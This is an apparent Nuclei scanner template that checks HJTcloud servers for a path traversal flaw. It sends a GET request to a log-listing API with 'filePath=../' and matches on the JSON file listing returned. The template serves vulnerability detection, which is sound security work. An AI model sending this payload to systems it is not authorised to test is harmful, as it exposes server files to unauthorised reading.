http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"name":'
    - '"length":'
    - '"filePath":'
    - '"list":'
  - part: header
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/him/api/rest/V1.0/system/log/list?filePath=../'
id: hjtcloud-rest-arbitrary-file-read
info:
  author: pikpikcu
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  description: HJTcloud is vulnerable to local file inclusion.
  metadata:
    max-request: 1
  name: HJTcloud - Local File Inclusion
  reference:
  - https://mp.weixin.qq.com/s/w2pkj5ADN7b5uxe-wmfGbw
  severity: high
  tags: hjtcloud,lfi,vuln
